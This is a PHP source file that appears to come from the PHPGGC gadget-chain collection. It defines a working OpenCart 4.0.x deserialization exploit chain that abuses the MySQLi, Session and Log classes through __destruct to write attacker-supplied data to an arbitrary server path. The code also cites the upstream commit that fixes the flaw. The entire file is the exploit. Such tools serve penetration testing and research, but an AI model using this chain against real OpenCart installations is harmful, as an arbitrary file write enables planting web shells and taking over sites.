<?php

namespace GadgetChain\OpenCart;

class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '4.0.0.0 <= 4.0.2.3+';
    public static $vector = '__destruct';
    public static $author = 'mcdruid';
    public static $information = 'This will stop working when the following:
    https://github.com/opencart/opencart/commit/087e20dd1cd9b441be5a327fd4b6698744bffb38
    ..is included in a release.';

    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $data = $parameters['data'];

        return new \Opencart\System\Library\DB\MySQLi(
            new \Opencart\System\Library\Session(
                new \Opencart\System\Library\Log($path),
                $data
            )
        );
    }
}